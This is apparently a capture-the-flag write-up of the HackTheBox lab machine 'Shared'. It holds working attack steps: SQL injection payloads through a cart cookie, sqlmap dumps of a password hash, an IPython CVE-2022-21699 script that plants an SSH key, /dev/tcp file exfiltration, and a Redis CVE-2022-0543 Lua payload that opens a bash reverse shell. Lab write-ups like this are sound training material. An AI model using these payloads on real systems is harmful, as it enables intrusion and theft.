---
title: HTB: Shared
url: https://0xdf.gitlab.io/2022/11/12/htb-shared.html
date: 2022-11-12T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-shared, nmap, wfuzz, sqli, sqli-union, sqlmap, burp, burp-repeater, crackstation, pspy, cve-2022-21699, ipython, redis, wireshark, strace, ghidra, reverse-engineering, cve-2022-0543
---

![Shared](https://0xdfimages.gitlab.io/img/shared-cover.png)

Shared starts out with a SQL injection via a cookie value. From there, I’ll find creds and get access over SSH. The first pivot abused a code execution vulnerability in iPython. From there, I’ll reverse (both dynamically and statically) a binary to get Redis creds, and exploit Redis to get execution.

## Box Info

| Name | [Shared](https://hackthebox.com/machines/shared)  [Shared](https://hackthebox.com/machines/shared) [Play on HackTheBox](https://hackthebox.com/machines/shared) |
| --- | --- |
| Release Date | [23 Jul 2022](https://twitter.com/hackthebox_eu/status/1542176123961987074) |
| Retire Date | 12 Nov 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Shared |
| Radar Graph | Radar chart for Shared |
| First Blood User | 00:53:13[irogir irogir](https://app.hackthebox.com/users/476556) |
| First Blood Root | 01:08:43[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creator | [Nauten Nauten](https://app.hackthebox.com/users/27582) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.172
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-13 09:23 UTC
Warning: 10.10.11.172 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.172
Host is up (0.095s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 9.60 seconds
oxdf@hacky$ nmap -p 22,80,443 -sCV 10.10.11.172
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-13 09:23 UTC
Nmap scan report for 10.10.11.172
Host is up (0.093s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://shared.htb
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://shared.htb
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
| tls-alpn: 
|   h2
|_  http/1.1
| tls-nextprotoneg: 
|   h2
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.56 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian 11 bullseye.

On HTTP, it’s just returning a redirect to `https://shared.htb`, changing the protocol from HTTPS *and* using a domain name.

There’s a TLS certificate on 443 that serves as a wildcard certificate for `*.shared.htb`.

![image-20221107120757794](https://0xdfimages.gitlab.io/img/image-20221107120757794.png)

### Subdomain Fuzz

I’ll use `wfuzz` to look for subdomains that return different results than the default case. It seems the default case is a 301 response of length 169:

```

oxdf@hacky$ wfuzz -u https://10.10.11.172 -H "Host: FUZZ.shared.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.11.172/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000005:   301        7 L      11 W     169 Ch      "webmail"
000000004:   301        7 L      11 W     169 Ch      "localhost"
000000006:   301        7 L      11 W     169 Ch      "smtp"
000000007:   301        7 L      11 W     169 Ch      "webdisk"
000000008:   301        7 L      11 W     169 Ch      "pop"
000000009:   301        7 L      11 W     169 Ch      "cpanel"
000000010:   301        7 L      11 W     169 Ch      "whm"
000000001:   302        0 L      0 W      0 Ch        "www"
000000002:   301        7 L      11 W     169 Ch      "mail"
000000003:   301        7 L      11 W     169 Ch      "ftp"
000000011:   301        7 L      11 W     169 Ch      "ns1"
000000012:   301        7 L      11 W     169 Ch      "ns2"
000000013:   301        7 L      11 W     169 Ch      "autodiscover"
000000014:   301        7 L      11 W     169 Ch      "autoconfig"
^C
Finishing pending requests...

```

I’ll hide the default case with `--hh 169`:

```

oxdf@hacky$ wfuzz -u https://10.10.11.172 -H "Host: FUZZ.shared.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 169
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.11.172/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000001:   302        0 L      0 W      0 Ch        "www"
000002549:   200        64 L     151 W    3229 Ch     "checkout"

Total time: 46.86809
Processed Requests: 4989
Filtered Requests: 4987
Requests/sec.: 106.4476

```

I’ll add both as well as the root domain to `/etc/hosts` on my local system:

```
10.10.11.172 shared.htb checkout.shared.htb www.shared.htb

```

### shared.htb / cart.shared.htb - TCP 443

#### Site

Visiting over HTTP or HTTPS to the IP or `share.htb` or `www.shared.htb` all end up with redirects to `https://shared.htb/index.php`, which is a site selling things:

[![image-20220713105838754](https://0xdfimages.gitlab.io/img/image-20220713105838754.png)](https://0xdfimages.gitlab.io/img/image-20220713105838754.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220713105838754.png)

I can add an item to the cart, and view the cart:

![image-20220713133203059](https://0xdfimages.gitlab.io/img/image-20220713133203059.png)

Clicking “Proceed to Checkout” goes to `https://checkout.shared.htb`:

![image-20220713133233898](https://0xdfimages.gitlab.io/img/image-20220713133233898.png)

If I enter a card and CVV and submit, it says the payment was accepted:

![image-20220713133322965](https://0xdfimages.gitlab.io/img/image-20220713133322965.png)

#### Tech Stack

The site is clearly based on PHP, and running on NGINX. There’s not much else to find in the HTTP requests in general.

Basically every request is to `/index.php`. There are different filtered views of products, all of which seem to be at `index.php` with different GET parameters that reflect what products to show. For example, on the main site: `/index.php?id_category=3&controller=category`. Viewing a single item page is also `index.php` with different args. The view cart page is also `index.php`, just with `controller=cart&action=show`.

If I add an item to my cart, it does a POST request to `/index.php?controller=cart`, and the result is a response that sets a new cookie:

```

Set-Cookie: custom_cart=%7B%2253GG2EF8%22%3A%221%22%7D; 

```

This is URL encided, which decodes to:

```

{"53GG2EF8":"1"}

```

#### Directory Brute Force

I’ll try to run `feroxbuster` against the site, and include `-x php` since I know the site is PHP, but after a short time, it just starts returning a ton of errors. I could try `gobuster` or another tool, but for now I’ll skip this and move on (I won’t need it).

## Shell as james\_mason

### SQL Injection

#### Identify

The site is using the `custom_cart` cookie to store the number of each item for a given user. For the page to then return the image and price and other info, it will have to take that ID and query the database for the rest of the data associated with it.

I’ll send the cart request over to Burp Repeater, and use the “Render” view for the responses:

[![image-20220713133043591](https://0xdfimages.gitlab.io/img/image-20220713133043591.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220713133043591.png)

Messing with this cookie on `shared.htb` doesn’t do anything. The cart must be associated with the session cookie on the server.

I’ll check the same thing on `checkout.shared.htb`. First, I’ll send the request to repeater, and URL decode the cookie and see if the page still works. It does:

[![image-20220713133549091](https://0xdfimages.gitlab.io/img/image-20220713133549091.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220713133549091.png)

If I change the quantity and send, that updates:

[![image-20220713133617449](https://0xdfimages.gitlab.io/img/image-20220713133617449.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220713133617449.png)

If I add a character to the first string, the product information goes away:

[![image-20220713133706334](https://0xdfimages.gitlab.io/img/image-20220713133706334.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220713133706334.png)

The next thing to try is a `'` to look for SQL injection. Adding a trailing single quote still returns “Not Found”:

[![image-20220713133814399](https://0xdfimages.gitlab.io/img/image-20220713133814399.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220713133814399.png)

What if I try to use a comment to fix that SQL query? Potentially, the SQL query could look like `SELECT * FROM items WHERE ID = '[input]';`. If I send `'`, that just breaks, and good error handling could lead to nothing. But what about `'-- -`. This comments out what follows my injection. That works!

[![image-20220713134011615](https://0xdfimages.gitlab.io/img/image-20220713134011615.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220713134011615.png)

This is SQL injection.

#### Union Injection

I’ll test to see if I can leak data using union injection. When I add `' union select 1-- -`, it returns Not Found. I’ll start adding more numbers until I’ve added the right number of columns. At three, it works:

[![image-20220713142157702](https://0xdfimages.gitlab.io/img/image-20220713142157702.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220713142157702.png)

But it doesn’t show any data. It must be that the query is only taking the first row of data, so with the query again, it gets the legit row and then a row of `1,2,3`, only the legit row is used. I can test this by making the id invalid:

[![image-20220713142315499](https://0xdfimages.gitlab.io/img/image-20220713142315499.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220713142315499.png)

It worked! I’ll change my numbers to see what is being written back in the response. Only the middle column generates data in a way that’s useful:

[![image-20220713142536987](https://0xdfimages.gitlab.io/img/image-20220713142536987.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220713142536987.png)

I have control over the third column as well, but only for numbers.

#### sqlmap

This SQLI is actually a bit tricky for `sqlmap` to find. If I pass it just the URL and the cookie, I’ll have to increase the level and risk, and it will take 10 minutes:

```

oxdf@hacky$ sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --level 3 --risk 3
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.6.12#dev}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage 
caused by this program

[*] starting @ 13:11:29 /2022-08-12/
...[snip]...
[13:21:25] [INFO] (custom) HEADER parameter 'Cookie #1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) HEADER parameter 'Cookie #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 1763 HTTP(s) requests:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: custom_cart={"' AND 2668=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- rRoO":"1"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: custom_cart={"' UNION ALL SELECT NULL,CONCAT(0x71707a6b71,0x734c79424b45765669424a43437741676c51796c506b44416258586265587a786d7854696c737a58,0x71717a7871),NULL-- -":"1"}
---
[13:21:27] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL > 5.0.12 (MariaDB fork)
[13:21:27] [INFO] fetched data logged to text files under '/home/oxdf/.sqlmap/output/checkout.shared.htb'

[*] ending @ 13:21:27 /2022-08-12/

```

But given I already know some details about the injection, I can specify technique and number of columns, and it finds the injection in down to 20 seconds:

```

oxdf@hacky$ sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --technique U --union-cols 3 --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.6.12#dev}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:23:39 /2022-08-12/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[13:23:39] [INFO] testing connection to the target URL
[13:23:40] [INFO] checking if the target is protected by some kind of WAF/IPS
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
[13:23:40] [WARNING] heuristic (basic) test shows that (custom) HEADER parameter 'Cookie #1*' might not be injectable
[13:23:41] [INFO] testing for SQL injection on (custom) HEADER parameter 'Cookie #1*'
[13:23:41] [INFO] testing 'Generic UNION query (NULL) - 3 to 3 columns (custom)'
[13:23:41] [WARNING] applying generic concatenation (CONCAT)
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[13:23:48] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[13:23:55] [INFO] (custom) HEADER parameter 'Cookie #1*' is 'Generic UNION query (NULL) - 3 to 3 columns (custom)' injectable
[13:23:55] [INFO] checking if the injection point on (custom) HEADER parameter 'Cookie #1*' is a false positive
(custom) HEADER parameter 'Cookie #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 57 HTTP(s) requests:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns (custom)
    Payload: custom_cart={"' UNION ALL SELECT NULL,CONCAT(CONCAT('qkzzq','qkLgtkpenVgVOfSjpNljLUkfXDPnOuEMartRDuNE'),'qzqvq'),NULL-- bgRi":"1"}
---
[13:23:57] [INFO] testing MySQL
[13:23:58] [INFO] confirming MySQL
[13:23:59] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[13:23:59] [INFO] fetched data logged to text files under '/home/oxdf/.sqlmap/output/checkout.shared.htb'

[*] ending @ 13:23:59 /2022-08-12/

```

#### Database Enumeration

There are two databases (and `information_schema` is the MySQL default):

```

oxdf@hacky$ sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --technique U --union-cols 3 --batch --dbs
...[snip]...
[13:27:52] [INFO] fetching database names
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
available databases [2]:
[*] checkout
[*] information_schema
...[snip]...

```

`checkout` has two tables:

```

oxdf@hacky$ sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --technique U --union-cols 3 --batch -D checkout --tables
...[snip]...
[13:28:36] [INFO] fetching tables for database: 'checkout'
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
Database: checkout
[2 tables]
+---------+
| user    |
| product |
+---------+
...[snip]...

```

I’ll dump both tables. The `product` table isn’t interesting, but the `user` table has a hash:

```

oxdf@hacky$ sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --technique U --union-cols 3 --batch -D checkout -T user --dump
...[snip]...
Database: checkout
Table: user
[1 entry]
+----+----------------------------------+-------------+
| id | password                         | username    |
+----+----------------------------------+-------------+
| 1  | fc895d4eddc2fc12f995e18c865cf273 | james_mason |
+----+----------------------------------+-------------+
...[snip]...

```

### Shell

#### Crack Hash

I’ll drop that hash into [CrackStation](https://crackstation.net/), and it returns a match:

[![image-20220712105141353](https://0xdfimages.gitlab.io/img/image-20220712105141353.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220712105141353.png)

#### SSH

Using the username from the database and the password “Soleil101” works for SSH:

```

oxdf@hacky$ sshpass -p 'Soleil101' ssh james_mason@shared.htb
...[snip]...
james_mason@shared:~$ 

```

## Shell as dan\_smith

### Enumeration

#### Home Directories

There’s not much of interesting in james\_mason’s home directory. There is one other user with a home directory:

```

james_mason@shared:/home$ ls -l
total 8
drwxr-xr-x 4 dan_smith   dan_smith   4096 Jul 11 08:13 dan_smith
drwxr-xr-x 2 james_mason james_mason 4096 Mar 20 09:42 james_mason

```

#### scripts\_review

In `/opt`, there’s a `scripts_review` folder:

```

james_mason@shared:/opt$ ls -l
total 4
drwxrwx--- 2 root developer 4096 Mar 20 09:41 scripts_review

```

It’s owned by the developer group, which james\_mason is a member of:

```

james_mason@shared:~$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)

```

It’s empty:

```

james_mason@shared:/opt/scripts_review$ ls -la
total 8
drwxrwx--- 2 root developer 4096 Mar 20 09:41 .
drwxr-xr-x 3 root root      4096 Mar 20 09:41 ..

```

#### Processes

I’ll upload [pspy](https://github.com/DominicBreuker/pspy) to the box and run it. Every minute, there’s a cron running:

```

2022/07/13 14:43:01 CMD: UID=0    PID=6895   | /usr/sbin/cron -f 
2022/07/13 14:43:01 CMD: UID=0    PID=6894   | /usr/sbin/CRON -f 
2022/07/13 14:43:01 CMD: UID=0    PID=6896   | /bin/sh -c /root/c.sh 
2022/07/13 14:43:01 CMD: UID=0    PID=6898   | /bin/bash /root/c.sh 
2022/07/13 14:43:01 CMD: UID=0    PID=6897   | /bin/bash /root/c.sh 
2022/07/13 14:43:01 CMD: UID=1001 PID=6899   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/07/13 14:43:01 CMD: UID=1001 PID=6900   | /usr/bin/pkill ipython 
2022/07/13 14:43:01 CMD: UID=1001 PID=6901   | /usr/bin/python3 /usr/local/bin/ipython 

```

root is running `/root/c.sh`, which seems to include a sleep, but I don’t see what it does after.

UID 1001 (which is dan\_smith) is killing running instances of `ipython`, and then going into `scripts_review` and running `ipython`.

The version of `ipython` on Shared is 8.0.0:

```

james_mason@shared:~$ /usr/local/bin/ipython -V
8.0.0

```

### CVE-2022-21699

#### Background

There’s a vulnerability with `ipython` in version 8.0.0, CVE-2022-21699, that allows one user to drop a script in a specific folder that will be run when another user runs `ipython`. The writeup [here](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x) gives a proof of concept. I’ll need to do is write a script in `./profile_default/startup` in the directory that the other user will run `ipython` from, and my script will be run as that user.

#### Write SSH Key

To abuse this, I’ll write a Python script that just makes sure the `.ssh` directory for dan\_smith exists, and then appends my key to the the `authorized_keys` file:

```

import os

os.makedirs("/home/dan_smith/.ssh", exist_ok=True)
f=open("/home/dan_smith/.ssh/authorized_keys", "a")
f.write("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing")
f.close()

```

It seems that the folders / files in `/opt/scripts_review` get cleared out fairly regularly, so I’ll craft one line that generates the folders, makes sure they are writable by other users, and then writes the script:

```

james_mason@shared:/opt/scripts_review$ mkdir -p profile_default/startup; \
> chmod -R 777 profile_default; \
> echo 'import os; os.makedirs("/home/dan_smith/.ssh", exist_ok=True); f=open("/home/dan_smith/.ssh/authorized_keys", "a"); f.write("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing"); f.close()' > profile_default/startup/0xdf.py

```

Once the script runs again, I can SSH into the box as dan\_smith:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen dan_smith@shared.htb
Linux shared 5.10.0-12-amd64 #1 SMP Debian 5.10.103-1 (2022-03-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jul 12 11:22:01 2022 from 10.10.14.6
dan_smith@shared:~$ 

```

And grab `user.txt`:

```

dan_smith@shared:~$ cat user.txt
ffacd863************************

```

## Shell as root

### Enumeration

#### File System

Outside of `user.txt`, there’s nothing interesting in dan\_smith’s home directory. dan\_smith does has an additional group, `sysadmin`:

```

dan_smith@shared:~$ id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)

```

Looking for files owned by this group, there’s only one:

```

dan_smith@shared:~$ find / -group sysadmin 2>/dev/null | grep -v '^/(sys|proc)'
/usr/local/bin/redis_connector_dev

```

#### Listening Services

`netstat` shows something listening on Redis’ default port, 6379:

```

dan_smith@shared:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      - 

```

### redis\_connector\_dev

#### Run It

I can run this binary, and it prints output like it connected:

```

dan_smith@shared:~$ redis_connector_dev 
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-12-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:669
run_id:8ab08023e46192e4b800b3804e6c00b912241809
tcp_port:6379
uptime_in_seconds:12535
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:13472561
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>

```

This looks like the result of the `info server` command. `redis-cli` is on the box, however, if I try to connect, it’s asking for auth:

```

dan_smith@shared:~$ redis-cli 
127.0.0.1:6379> info
NOAUTH Authentication required.

```

#### Exfil

I’ll start `nc -lnvp 445 > redis_connector_dev` on my host, and then send the file via Bash:

```

dan_smith@shared:~$ cat /usr/local/bin/redis_connector_dev > /dev/tcp/10.10.14.6/445

```

The file arrives:

```

oxdf@hacky$ nc -lnvp 445 > redis_connector_dev
Listening on 0.0.0.0 445
Connection received on 10.10.11.172 36236

```

### Get Password

#### Dynamically

If I run the binary on my system, it fails to connect:

```

oxdf@hacky$ ./redis_connector_dev 
[+] Logging to redis instance using password...

INFO command result:
 dial tcp [::1]:6379: connect: connection refused

```

I’ll disconnect my SSH session and reconnect with a tunnel from my local 6389 to Shared’s using `-L 6379:localhost:6379`. Now on running again, it works:

```

oxdf@hacky$ ./redis_connector_dev 
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
...[snip]...

```

If I run WireShark listening on the `lo` interface, it shows the exchange, including the password “F2WHqJUz2WEz=Gqq”:

![image-20220712113532881](https://0xdfimages.gitlab.io/img/image-20220712113532881.png)

Alternatively, I can do the same thing with `strace` instead of WireShark:

```

oxdf@hacky$ strace ./redis_connector_dev 
...[snip]...
write(6, "*2\r\n$4\r\nauth\r\n$16\r\nF2WHqJUz2WEz="..., 37) = 37
...[snip]...

```

Working up from the bottom, just above the output there’s a call to `write` which sends the auth commands into the socket (presumably file handle 6). It’s truncated a bit. To get the full command, I’ll add `-s 1000 -v` to print up to 1000 characters of each command (from the default 32):

```

oxdf@hacky$ strace -v -s 1000 ./redis_connector_dev 
...[snip]...
write(6, "*2\r\n$4\r\nauth\r\n$16\r\nF2WHqJUz2WEz=Gqq\r\n", 37) = 37
...[snip]...

```

One more way is to not create the tunnel, but setup `nc` to listen on 6379 on localhost, and then run `redis_connector_dev`. The password is displayed:

```

oxdf@hacky$ nc -lnvp 6379
Listening on 0.0.0.0 6379
Connection received on 127.0.0.1 39828
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq

```

#### Statically

The file is written in Go:

```

oxdf@hacky$ file redis_connector_dev 
redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped

```

I’ll open the file in Ghidra, and find the `main.main` function. Without taking any time to re-name, re-type, or change anything, I can kind of get an idea what’s going on:

![image-20220713172423419](https://0xdfimages.gitlab.io/img/image-20220713172423419.png)

It’s creating a Redis client, connecting with the `cmdable` object, and then converting the results to a string and printing them. Ignore that the arguments aren’t aligned right. Ghidra doesn’t do a great job with Go.

There’s two globals that are referenced. Any time you see something getting set as an address and then the following word is an integer, that’s likely a string in Go. Go doesn’t null terminate strings, but rather just refers to them by pointer and length.

There’s two here:

![image-20220713172656088](https://0xdfimages.gitlab.io/img/image-20220713172656088.png)

The first one looks like the connection string:

![image-20220713172732063](https://0xdfimages.gitlab.io/img/image-20220713172732063.png)

If I right click on the first letter, “Data” > “Choose Data Type…”, it’ll pop this box. I’ll set it to an array of `char` using the length from above:

![image-20220713172827277](https://0xdfimages.gitlab.io/img/image-20220713172827277.png)

Now it prints nice:

![image-20220713172839501](https://0xdfimages.gitlab.io/img/image-20220713172839501.png)

I’ll do the same with the next one:

![image-20220713172912882](https://0xdfimages.gitlab.io/img/image-20220713172912882.png)

It’s important to pay attention to the length, or else it’s easy to read too far and get the wrong password:

![image-20220713172949404](https://0xdfimages.gitlab.io/img/image-20220713172949404.png)

### Strategy

HackTricks has a really nice [page on Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce). Under RCE, there’s a bunch of options. Some involved writing webshells. The one that jumped out immediately to me is writing an SSH key. Unfortunately for me, that one fails because there’s no `.ssh` directory in `/root`, and Redis won’t create one.

With the creds, I can auth to Redis:

```

dan_smith@shared:~$ redis-cli 
127.0.0.1:6379> auth F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> 

```

With access to Redis, I can write an SSH key as root. I’ll go with the one HackTricks calls “LUA Sandbox Bypass”, or CVE-2022-0543.

### CVE-2022-0543

#### Enumeration

`info server` shows the Redis version:

```
127.0.0.1:6379> info server
# Server
redis_version:6.0.15
...[snip]...

```

#### Exploit

The researcher who discovered CVE-2022-0543 describes it well in [this post](https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce). It’s actually a vulnerability in Debian where Redis is present. The proof of concept looks like this:

```

eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so", "luaopen_os"); local os = os_l(); os.execute("touch /tmp/redis_poc"); return 0'

```

Running this directly won’t work:

```
127.0.0.1:6379> eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so", "luaopen_os"); local os = os_l(); os.execute("touch /tmp/redis_poc"); return 0'
(error) ERR wrong number of arguments for 'eval' command

```

That’s because `eval` takes a minimum of two arguments, according to [the docs](https://redis.io/commands/eval/). I’ll give it a 0, and it’s a new error:

```
127.0.0.1:6379> eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so", "luaopen_os"); local os = os_l(); os.execute("touch /tmp/redis_poc"); return 0' 0 
(error) ERR Error running script (call to f_9dde318a677aa429bd40e6b54cf363002dda0971): @user_script:1: user_script:1: attempt to call local 'os_l' (a nil value)

```

`os_l` is a nil value. That’s where the library is loaded. Is that library present? It turns out not:

```

dan_smith@shared:~$ ls /usr/lib/x86_64-linux-gnu/liblua5.1.so
ls: cannot access '/usr/lib/x86_64-linux-gnu/liblua5.1.so': No such file or directory
dan_smith@shared:~$ ls /usr/lib/x86_64-linux-gnu/liblua5.1.so*
/usr/lib/x86_64-linux-gnu/liblua5.1.so.0  /usr/lib/x86_64-linux-gnu/liblua5.1.so.0.0.0

```

But `liblua5.1.so.0` is, in the same directory. I’ll try that:

```
127.0.0.1:6379> eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = os_l(); os.execute("touch /tmp/redis_poc"); return 0' 0 
(integer) 0

```

It seems to work. But there’s no file in `/tmp`:

```

dan_smith@shared:~$ ls /tmp/
systemd-private-bec33c1489384520996f91f25f4fa934-redis-server.service-bo2wJh
systemd-private-bec33c1489384520996f91f25f4fa934-systemd-logind.service-yzWFZh
systemd-private-bec33c1489384520996f91f25f4fa934-systemd-timesyncd.service-n0pL5g
vmware-root_398-558012343

```

Writing to `/tmp` can be weird. I’ll try `/dev/shm`:

```
127.0.0.1:6379> eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = os_l(); os.execute("touch /dev/shm/redis_poc"); return 0' 0 
(integer) 0

```

It works:

```

dan_smith@shared:~$ ls /dev/shm/
redis_poc

```

#### Shell

I can use this to get a reverse shell:

```
127.0.0.1:6379> eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = os_l(); os.execute("bash -c \'bash -i >& /dev/tcp/10.10.14.6/443 0>&1\'"); return 0' 0

```

It hangs, but at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.172 36284
bash: cannot set terminal process group (2058): Inappropriate ioctl for device
bash: no job control in this shell
root@shared:/var/lib/redis#

```

This shell seems to die every minute, so I’ll have to work quickly to get the flag:

```

root@shared:~# cat root.txt
55e4f416************************

```

#### Script

Googling for “cve-2022-0543 site:github.com” returns a [POC by aodsec](https://github.com/aodsec/CVE-2022-0543/blob/main/CVE-2022-0543.py), which takes a slightly different approach to the loaded Lua, and manages to get output printed in the Redis terminal:

```
